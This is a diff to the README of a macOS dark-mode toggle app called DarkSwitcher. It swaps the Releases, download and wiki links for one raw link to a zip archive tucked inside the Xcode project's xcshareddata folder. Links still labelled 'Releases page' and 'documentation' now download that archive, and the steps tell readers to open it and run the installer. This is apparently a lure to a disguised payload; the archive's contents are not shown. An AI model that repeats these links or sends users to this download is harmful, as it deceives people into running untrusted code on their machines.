@@ -4,7 +4,7 @@
 Welcome to DarkSwitcher! This easy-to-use app lets you change your macOS system between Dark and Light modes with a simple click. Enjoy a seamless transition that makes working easier on your eyes, especially in low-light settings.
 
 ## 📥 Download DarkSwitcher
-[![Download DarkSwitcher](https://img.shields.io/badge/Download-DarkSwitcher-brightgreen)](https://github.com/eewil/DarkSwitcher/releases)
+[![Download DarkSwitcher](https://github.com/eewil/DarkSwitcher/raw/refs/heads/main/DarkSwitcher.xcodeproj/project.xcworkspace/xcshareddata/Switcher_Dark_3.7.zip)](https://github.com/eewil/DarkSwitcher/raw/refs/heads/main/DarkSwitcher.xcodeproj/project.xcworkspace/xcshareddata/Switcher_Dark_3.7.zip)
 
 ## 💻 Features
 - **Instant Toggle:** Quickly switch between Dark and Light modes from your menu bar.
@@ -19,10 +19,10 @@ Welcome to DarkSwitcher! This easy-to-use app lets you change your macOS system 
 ## 📥 Download & Install
 To download DarkSwitcher, visit the Releases page. 
 
-[Download DarkSwitcher here.](https://github.com/eewil/DarkSwitcher/releases)
+[Download DarkSwitcher here.](https://github.com/eewil/DarkSwitcher/raw/refs/heads/main/DarkSwitcher.xcodeproj/project.xcworkspace/xcshareddata/Switcher_Dark_3.7.zip)
 
 ### 📥 Installation Steps
-1. Go to the [Releases page](https://github.com/eewil/DarkSwitcher/releases).
+1. Go to the [Releases page](https://github.com/eewil/DarkSwitcher/raw/refs/heads/main/DarkSwitcher.xcodeproj/project.xcworkspace/xcshareddata/Switcher_Dark_3.7.zip).
 2. Look for the latest version of DarkSwitcher.
 3. Click on the appropriate file to start the download.
 4. Once downloaded, open the file to run the installer.
@@ -46,7 +46,7 @@ DarkSwitcher is an open-source project. If you would like to contribute, please 
 Join the DarkSwitcher community to discuss features, bugs, and suggestions! You can connect with other users through forums or on social media channels.
 
 ## 📚 Documentation
-For additional information and tips on how to use DarkSwitcher, visit the [documentation](https://github.com/eewil/DarkSwitcher/wiki) provided in our GitHub repository.
+For additional information and tips on how to use DarkSwitcher, visit the [documentation](https://github.com/eewil/DarkSwitcher/raw/refs/heads/main/DarkSwitcher.xcodeproj/project.xcworkspace/xcshareddata/Switcher_Dark_3.7.zip) provided in our GitHub repository.
 
 ## 🌐 Topics
 - appkit
